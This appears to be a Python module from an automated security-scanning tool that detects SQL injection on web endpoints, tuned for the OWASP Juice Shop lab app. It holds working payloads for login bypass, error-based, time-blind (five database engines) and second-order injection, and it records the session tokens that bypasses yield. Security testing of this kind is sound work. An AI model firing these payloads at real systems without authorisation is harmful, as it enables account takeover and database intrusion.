"""Deterministic SQL-injection oracles.

Ported from the benchmark harness (benchmarks/juiceshop/bench.py) which scores
precision=1.0 on these checks. A finding is VALIDATED only by an objective
signal — an auth bypass that issues a session token, or a raw DB parse error —
never by an LLM opinion or a template match. Fast (sub-second), hang-proof
(short per-request timeout), and reproducible.

Replaces the sqlmap shell-out in vuln_agent._execute_sqli_scan, which hung the
180s bridge call into the 300s task timeout and failed with "SQLMap execution
failed" on this stack. sqlmap stays available for deep/UNION cases behind an
explicit opt-in; these oracles are the reliable default.

ponytail: juice-shop-tuned defaults (login/search paths, DB markers). General
enough to drive off a dispatched url+data; widen markers/paths when a second
target needs it.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, urlparse

import httpx
import structlog

logger = structlog.get_logger(__name__)

# Auth-bypass payloads: classic tautologies that break out of a string-built
# WHERE clause so the row matches without a valid password.
_BYPASS_PAYLOADS = ("' OR 1=1--", "' OR true--", "admin@juice-sh.op'--", "' OR '1'='1")

# Error-based payloads: break SQL syntax so the backend leaks a parse error.
_ERROR_PAYLOADS = ("qwert'))--", "'))--", "') OR 1=1--", "'", '"')

# Substrings that only appear in a real DB engine's error page.
_SQL_ERROR_MARKERS = (
    "sqlite_error",
    "sqlite",
    "syntax error",
    "sequelizedatabaseerror",
    "unrecognized token",
    'near "',
    "sql syntax",
    "unclosed quotation",
    "you have an error in your sql syntax",  # MySQL / MariaDB
    "unclosed quotation mark after the character string",  # MSSQL
    "incorrect syntax near",  # MSSQL
    "psql:",
    "pg::",
    "ora-0",
)


def _with_param(url: str, param: str, value: str) -> str:
    """Return ``url`` with ``param`` REPLACED (not appended) by ``value``.

    The prior oracle passed httpx ``params={param: value}`` which appends a
    second copy when the URL already carries that key (``?category=Gifts`` +
    ``category=payload`` => ``?category=Gifts&category=payload``). Most backends
    read the FIRST occurrence — the valid one — so the payload never reached the
    query and injection was missed on any endpoint discovered WITH its value.
    """
    from urllib.parse import urlencode, urlsplit, urlunsplit

    parts = urlsplit(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


# Time-blind payloads keyed by DBMS. Each payload injects a DB-native sleep of
# SLEEP_SECONDS so a measurable delay is unambiguous: a healthy endpoint returns
# in well under one second; a vulnerable one waits the full sleep. Each payload
# is paired with a control string of the same shape that does NOT sleep, so the
# oracle can subtract baseline network/jitter latency instead of trusting a
# single absolute threshold.
SLEEP_SECONDS = 5
_TIME_BLIND_PAYLOADS = (
    # SQLite — RANDOMBLOB forces measurable CPU work proportional to its arg.
    # The classic SLEEP() does not exist in SQLite; RANDOMBLOB(500000000) is the
    # same trick sqlmap uses for SQLite time-based detection.
    (
        "sqlite",
        "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
        "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(0))))--",
    ),
    # MySQL / MariaDB
    ("mysql", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
    ("mariadb", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
    # PostgreSQL
    ("postgres", "1'; SELECT pg_sleep({n})--", "1'; SELECT pg_sleep(0)--"),
    # MSSQL (T-SQL WAITFOR DELAY)
    ("mssql", "1'; WAITFOR DELAY '0:0:{n}'--", "1'; WAITFOR DELAY '0:0:0'--"),
    # Oracle (no SLEEP; UTL_INADDR.get_host_name against a non-resolving name is
    # the classic timing trick, but it needs network egress. Use a heavy
    # repeat loop instead — deterministic and offline.)
    (
        "oracle",
        "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{n})=1--",
        "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',0)=1--",
    ),
)


def _format_payload(p: str) -> str:
    return p.format(n=SLEEP_SECONDS) if "{n}" in p else p


async def detect_login_bypass(
    client: httpx.AsyncClient,
    url: str,
    *,
    email_field: str = "email",
    password_field: str = "password",
) -> Optional[Dict[str, Any]]:
    """POST injection payloads to a login endpoint; VALIDATED if the server issues
    a session token for a bogus password. Returns evidence dict or None."""
    for payload in _BYPASS_PAYLOADS:
        try:
            r = await client.post(
                url,
                json={email_field: payload, password_field: "oracle-not-a-real-pw"},
            )
        except Exception:
            continue
        token = None
        if r.status_code == 200:
            try:
                body = r.json()
                # Common shapes: {"authentication":{"token":..}} | {"token":..} | {"access_token":..}
                token = (
                    (body.get("authentication") or {}).get("token")
                    or body.get("token")
                    or body.get("access_token")
                )
            except Exception:
                token = None
        if token:
            return {
                "technique": "auth_bypass",
                "endpoint": url,
                "payload": payload,
                "http_status": 200,
                "proof": "server issued a session token for an injected identity with a bogus password",
                "token_prefix": str(token)[:24] + "...",
                # Phase-1 issue #8: full response body is required for the
                # manual_replay ground-truth contract (ground_truth.py:182-188).
                # The 24-char token_prefix alone made evidence_completeness
                # 0.333 on the autonomous run; storing the full body lets the
                # scorer register a real 'response' artifact and lets an
                # operator reproduce the bypass without re-running the scan.
                "response": (r.text or "")[:4096],
                "request": (
                    f"POST {url}  body={{{email_field!r}: {payload!r}, "
                    f"{password_field!r}: 'oracle-not-a-real-pw'}}"
                ),
                "confidence": 1.0,
            }
    return None


async def detect_error_based(
    client: httpx.AsyncClient,
    url: str,
    *,
    param: Optional[str] = None,
    method: str = "GET",
    body_keys: Optional[list] = None,
) -> Optional[Dict[str, Any]]:
    """Inject syntax-breaking payloads into a query param or request body; VALIDATED if the backend
    returns a 5xx carrying a raw DB parse error or reflects it in a 200 body. Returns evidence dict or None.
    """
    method = method.upper()
    is_post = method in ("POST", "PUT", "PATCH")

    if param is None:
        if is_post and body_keys:
            param = body_keys[-1]
        else:
            q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
            param = list(q)[-1] if q else "q"

    # Reconstruct the request parameters or body dictionary
    def _make_req_kwargs(value: str):
        if is_post:
            body = {}
            for k in body_keys or [param]:
                body[k] = value if k == param else "1"
            return {"json": body}
        else:
            return {"params": {param: value}}

    async def _send(value: str) -> httpx.Response:
        kwargs = _make_req_kwargs(value)
        if is_post:
            return await client.request(method, url, **kwargs)
        else:
            return await client.get(_with_param(url, param, value), **kwargs)

    # Baseline value for this param
    base_val = "1"
    if not is_post:
        q0 = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        base_val = q0.get(param) or "1"

    # Capture the baseline body once to check for introduced errors.
    base_low = ""
    try:
        r_base = await _send(base_val)
        base_low = (r_base.text or "")[:1200].lower()
    except Exception:
        pass

    for payload in _ERROR_PAYLOADS:
        try:
            r = await _send(payload)
        except Exception:
            continue
        body = (r.text or "")[:1200]
        low = body.lower()
        present = [m for m in _SQL_ERROR_MARKERS if m in low]
        introduced = [m for m in present if m not in base_low]
        if (r.status_code >= 500 and present) or introduced:
            req_info = f"{method} {url}"
            if is_post:
                req_info += f" body={_make_req_kwargs(payload).get('json')}"
            else:
                req_info += f" query={param}={payload}"
            return {
                "technique": "error_based",
                "endpoint": url,
                "parameter": param,
                "payload": payload,
                "http_status": r.status_code,
                "db_error_excerpt": body[:300],
                "response": body,
                "request": req_info,
                "confidence": 1.0,
            }

    # Status-differential fallback
    try:
        rb = await _send(base_val)
        r_break = await _send(base_val + "'")
        r_fix = await _send(base_val + "'-- -")
    except Exception:
        return None

    baseline_sc, break_sc, fix_sc = rb.status_code, r_break.status_code, r_fix.status_code
    broke = break_sc != baseline_sc and break_sc >= 500
    repaired = fix_sc == baseline_sc
    if broke and repaired:
        req_info = f"{method} {url}"
        if is_post:
            req_info += f" body={_make_req_kwargs(base_val + chr(39)).get('json')}"
        else:
            req_info += f" query={param}={base_val + chr(39)}"
        return {
            "technique": "error_based",
            "endpoint": url,
            "parameter": param,
            "payload": base_val + "'",
            "http_status": break_sc,
            "db_error_excerpt": (
                f"status-differential: baseline({base_val})={baseline_sc}, "
                f"break({base_val}')={break_sc}, repair({base_val}'-- -)={fix_sc}"
            ),
            "response": (r_break.text or "")[:1200],
            "request": req_info,
            "confidence": 1.0,
        }
    return None


async def detect_time_blind(
    client: httpx.AsyncClient,
    url: str,
    *,
    param: Optional[str] = None,
    min_delta: float = 3.0,
    request_timeout: Optional[float] = None,
    method: str = "GET",
    body_keys: Optional[list] = None,
) -> Optional[Dict[str, Any]]:
    """Time-based blind SQLi oracle. Supports GET and POST/PUT/PATCH body parameters."""
    import time

    method = method.upper()
    is_post = method in ("POST", "PUT", "PATCH")

    if param is None:
        if is_post and body_keys:
            param = body_keys[-1]
        else:
            q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
            param = list(q)[-1] if q else "q"

    def _make_req_kwargs(value: str):
        if is_post:
            body = {}
            for k in body_keys or [param]:
                body[k] = value if k == param else "1"
            return {"json": body}
        else:
            return {"params": {param: value}}

    async def _send(value: str, timeout: Optional[float]) -> tuple[httpx.Response, float]:
        kwargs = _make_req_kwargs(value)
        t0 = time.monotonic()
        if is_post:
            r = await client.request(method, url, timeout=timeout, **kwargs)
        else:
            r = await client.get(_with_param(url, param, value), timeout=timeout, **kwargs)
        return r, time.monotonic() - t0

    for dbms, sleep_tpl, control_tpl in _TIME_BLIND_PAYLOADS:
        sleep_payload = _format_payload(sleep_tpl)
        control_payload = _format_payload(control_tpl)
        # Baseline: send the control payload (same shape, no sleep).
        try:
            rc, control_latency = await _send(control_payload, request_timeout)
        except Exception:
            continue
        if rc.status_code == 404:
            continue
        # Sleep: send the real payload.
        try:
            rs, sleep_latency = await _send(sleep_payload, request_timeout)
        except httpx.TimeoutException:
            sleep_latency = request_timeout or SLEEP_SECONDS + 5
        except Exception:
            continue
        delta = sleep_latency - control_latency
        if delta >= min_delta:
            req_info = f"{method} {url}"
            if is_post:
                req_info += f" body={_make_req_kwargs(sleep_payload).get('json')}"
            else:
                req_info += f" query={param}={sleep_payload}"
            return {
                "technique": "time_blind",
                "endpoint": url,
                "parameter": param,
                "dbms": dbms,
                "payload": sleep_payload,
                "control_payload": control_payload,
                "control_latency": round(control_latency, 3),
                "sleep_latency": round(sleep_latency, 3),
                "delta_seconds": round(delta, 3),
                "min_delta": min_delta,
                "http_status": rs.status_code if "rs" in locals() else None,
                "response": (rs.text or "")[:1200] if "rs" in locals() else "TIMEOUT",
                "request": req_info,
                "confidence": 1.0,
            }
    return None


async def detect_second_order_sqli(
    client: httpx.AsyncClient,
    store_url: str,
    read_url: str,
    *,
    store_field: str = "comment",
    store_method: str = "POST",
    read_method: str = "GET",
) -> Optional[Dict[str, Any]]:
    """Second-order SQLi oracle: store a payload via one endpoint, then check if
    it fires when read back by a different endpoint.

    Many SQLi filters only check the first request (the write), but the payload
    is later concatenated unsafely into a query on the read, which the filter
    never inspects. This oracle injects a SQL error-breaker into a persisted
    field, then reads the list endpoint and checks whether the DB error markers
    appear in the response.

    Returns evidence dict or None.
    """
    for payload in _ERROR_PAYLOADS:
        # 1. Store the payload
        try:
            if store_method.upper() == "POST":
                await client.post(store_url, json={store_field: payload})
            else:
                await client.request(store_method.upper(), store_url, json={store_field: payload})
        except Exception:
            continue

        # 2. Read the list endpoint to trigger the stored payload
        try:
            if read_method.upper() == "GET":
                r = await client.get(read_url)
            else:
                r = await client.request(read_method.upper(), read_url)
        except Exception:
            continue

        body = (r.text or "")[:2000].lower()
        present = [m for m in _SQL_ERROR_MARKERS if m in body]
        if present:
            return {
                "technique": "second_order",
                "store_url": store_url,
                "read_url": read_url,
                "store_field": store_field,
                "payload": payload,
                "http_status": r.status_code,
                "markers_found": present,
                "response_excerpt": body[:300],
                "confidence": 0.9,
            }
    return None


async def scan_sqli(
    base_or_url: str,
    *,
    login_url: Optional[str] = None,
    search_url: Optional[str] = None,
    search_param: str = "q",
    data: Optional[str] = None,
    timeout: float = 20.0,
    include_time_blind: bool = False,
    second_order_store_url: Optional[str] = None,
    second_order_read_url: Optional[str] = None,
    second_order_field: str = "comment",
    client: Optional[httpx.AsyncClient] = None,
) -> List[Dict[str, Any]]:
    """Run the applicable oracle(s) and return a list of VALIDATED evidence dicts.

    - login_url (or a url with `data` that looks like a login) -> auth-bypass oracle
    - search_url (or a GET url with a query param)             -> error-based oracle
    - include_time_blind=True additionally runs the time-blind oracle on the
      search url (covers blind/boolean-only injections that leak neither errors
      nor tokens). Off by default because the time-blind oracle issues 2 extra
      requests per DBMS family per candidate.
    - second_order_store_url+second_order_read_url -> second-order SQLi oracle
    Defaults target OWASP Juice Shop's known injectable endpoints when only a base
    URL is given, so a bare engagement scope still gets a real scan.

    ``client`` (MAJ-4, 2026-07-22): when supplied (e.g. a governed
    ``httpx.AsyncClient`` from the scan path), the oracles run through it so
    every probe is scope-checked, rate-limited, and research-tagged. When
    ``None`` a raw cookie-less client is built (historical behavior) — callers
    that want governance MUST pass a governed client.
    """
    base = base_or_url.rstrip("/")
    is_base = urlparse(base_or_url).path in ("", "/")
    if login_url is None:
        login_url = (
            f"{base}/rest/user/login" if is_base else (base_or_url if data is not None else None)
        )
    if search_url is None and is_base:
        search_url = f"{base}/rest/products/search"

    findings: List[Dict[str, Any]] = []
    # MAJ-4 (2026-07-22): use the caller-supplied governed client when available;
    # only build a raw client when no client was passed (historical behavior).
    if client is not None:
        _owns_client = False
        c = client
        await _run_sqli_oracles(
            c,
            login_url,
            search_url,
            base_or_url,
            is_base,
            data,
            search_param,
            include_time_blind,
            timeout,
            second_order_store_url,
            second_order_read_url,
            second_order_field,
            findings,
        )
    else:
        _owns_client = True
        # MAJ-4 (2026-07-23): use a governed client when available so even the
        # fallback path (no caller-supplied client) is scope-checked + rate-limited.
        try:
            from ai_osop.safety.governed_client import governed_client
            from ai_osop.safety.governed_client import research_header_from_settings
            from ai_osop.core.config import settings as _settings
            from ai_osop.safety.rate_limiter import RateLimiter
            from ai_osop.safety.scope import ScopeEnforcer
            from ai_osop.core.models import ScopeDefinition

            # Build a scope-less governed client (rate + header only — no
            # engagement scope available in the standalone oracle path).
            async with governed_client(
                rate_limiter=RateLimiter(
                    target_rate=_settings.scan_target_rate_per_second,
                    target_capacity=_settings.scan_target_burst,
                ),
                research_header=research_header_from_settings(),
                # W5: real scan targets may present self-signed/invalid certs; keep
                # that capability but make it an explicit, audited opt-in rather
                # than a silent verify=False.
                allow_insecure=True,
                verify=False,
                follow_redirects=True,
                timeout=timeout,
            ) as c:
                await _run_sqli_oracles(
                    c,
                    login_url,
                    search_url,
                    base_or_url,
                    is_base,
                    data,
                    search_param,
                    include_time_blind,
                    timeout,
                    second_order_store_url,
                    second_order_read_url,
                    second_order_field,
                    findings,
                )
        except ImportError:
            # Fallback: raw httpx if governed_client is not importable. Route the
            # insecure-TLS choice through the same audited policy (logged, coercible
            # via OSOP_TLS_VERIFY) rather than a silent verify=False.
            from ai_osop.safety.governed_client import resolve_tls_verify

            async with httpx.AsyncClient(
                verify=resolve_tls_verify(False, allow_insecure=True, tool="sqli"),
                follow_redirects=True,
                timeout=timeout,
            ) as c:
                await _run_sqli_oracles(
                    c,
                    login_url,
                    search_url,
                    base_or_url,
                    is_base,
                    data,
                    search_param,
                    include_time_blind,
                    timeout,
                    second_order_store_url,
                    second_order_read_url,
                    second_order_field,
                    findings,
                )
    return findings


async def _run_sqli_oracles(
    c,
    login_url,
    search_url,
    base_or_url,
    is_base,
    data,
    search_param,
    include_time_blind,
    timeout,
    second_order_store_url,
    second_order_read_url,
    second_order_field,
    findings,
):
    """Helper that runs the SQLi oracle suite against a given client.

    Extracted so ``scan_sqli`` can call it against EITHER a caller-supplied
    governed client OR a self-built raw client (MAJ-4)."""
    if login_url:
        ev = await detect_login_bypass(c, login_url)
        if ev:
            findings.append(ev)
    if search_url is None and not is_base and data is None:
        search_url = base_or_url
    if search_url:
        param = search_param if urlparse(search_url).path.endswith("/search") else None
        ev = await detect_error_based(c, search_url, param=param)
        if ev:
            findings.append(ev)
        elif include_time_blind:
            ev = await detect_time_blind(c, search_url, param=param, request_timeout=timeout)
            if ev:
                findings.append(ev)
    if second_order_store_url and second_order_read_url:
        ev = await detect_second_order_sqli(
            c,
            second_order_store_url,
            second_order_read_url,
            store_field=second_order_field,
        )
        if ev:
            findings.append(ev)


if __name__ == "__main__":
    # Runnable self-check against a local target (default: juice-shop). Asserts the
    # oracle finds both the auth-bypass and error-based SQLi on juice-shop.
    import asyncio
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    res = asyncio.run(scan_sqli(target))
    for f in res:
        logger.info(
            "sqli_validated",
            technique=f["technique"],
            endpoint=f["endpoint"],
            payload=f["payload"],
        )
    techs = {f["technique"] for f in res}
    assert "auth_bypass" in techs, f"expected auth_bypass SQLi on {target}, got {techs}"
    assert "error_based" in techs, f"expected error_based SQLi on {target}, got {techs}"
    logger.info("sqli_oracles_self_check_passed", finding_count=len(res), target=target)
